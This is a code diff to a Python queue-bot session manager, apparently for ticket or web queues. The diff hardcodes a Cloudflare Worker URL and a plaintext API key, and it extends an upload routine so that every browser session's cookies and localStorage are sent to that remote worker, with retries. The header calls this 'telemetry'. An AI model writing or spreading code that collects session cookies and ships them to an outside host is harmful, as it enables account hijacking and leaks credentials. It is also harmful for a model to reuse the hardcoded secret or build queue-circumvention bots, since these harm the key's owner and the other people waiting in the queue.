@@ -10,14 +10,10 @@ Queue Bot Cloud - Gestión de Sesiones para Colas con captura completa
 import os
 
 # ==============================================================================
-# CONFIGURACIÓN CLOUD WORKER - SUBIDA AUTOMÁTICA Y TELEMETRÍA
+# CONFIGURACIÓN CLOUD WORKER - clave fija en el archivo
 # ==============================================================================
-# Variables de entorno al principio con sus valores listos para usar:
-os.environ.setdefault('WORKER_URL', 'https://boca-cookies.rosaleseze86.workers.dev')
-os.environ.setdefault('WORKER_API_KEY', '6HHGGVfCch0U80-3kfBZS5e8EbmeiEKE5kTea8FWn1o')
-
-WORKER_URL = os.environ['WORKER_URL']
-WORKER_API_KEY = os.environ['WORKER_API_KEY']
+WORKER_URL = 'https://boca-cookies.rosaleseze86.workers.dev'
+WORKER_API_KEY = '6HHGGVfCch0U80-3kfBZS5e8EbmeiEKE5kTea8FWn1o'
 # ==============================================================================
 
 # ⚙️ CONFIGURACIÓN: Cambiar entre 'local' o 'prod'
@@ -869,9 +865,10 @@ class SessionManager:
                 )
                 session['cookies_saved'] = True
                 
-                # Auto-upload al Worker (solo la primera sesión con cookies críticas)
-                if important and not getattr(self, '_worker_uploaded', False):
-                    self._upload_to_worker(session['id'], chrome_cookies, cookie_string, local_storage)
+                # Cada sesion sube una vez. Si el Worker no responde, queda el JSON local y reintenta.
+                if important and not session.get('cookies_uploaded'):
+                    if self._upload_to_worker(session['id'], chrome_cookies, cookie_string, local_storage):
+                        session['cookies_uploaded'] = True
                 
             except Exception as e:
                 logger.debug(f"Error capturando cookies sesion {session['id']}: {e}")
@@ -894,17 +891,24 @@ class SessionManager:
                 timeout=10
             )
             if resp.ok:
-                data = resp.json()
+                try:
+                    data = resp.json()
+                except Exception:
+                    data = {}
+                extra = ''
+                if data.get('history') is False:
+                    extra = ' (latest ok, historial no)'
                 logger.info(
                     f"UPLOAD sesion {session_id} -> Worker OK: "
                     f"{data.get('critical_count', 0)} criticas, "
-                    f"localStorage={len(local_storage)} items"
+                    f"localStorage={len(local_storage)} items{extra}"
                 )
-                self._worker_uploaded = True
-            else:
-                logger.warning(f"UPLOAD sesion {session_id} -> Worker FALLO: HTTP {resp.status_code}")
+                return True
+            logger.warning(f"UPLOAD sesion {session_id} -> Worker FALLO: HTTP {resp.status_code}")
+            return False
         except Exception as e:
             logger.warning(f"UPLOAD sesion {session_id} -> Worker ERROR: {e}")
+            return False
 
     def _send_queue_heartbeat(self):
         """Envía telemetría de tiempos de espera al Cloudflare Worker para monitoreo remoto"""
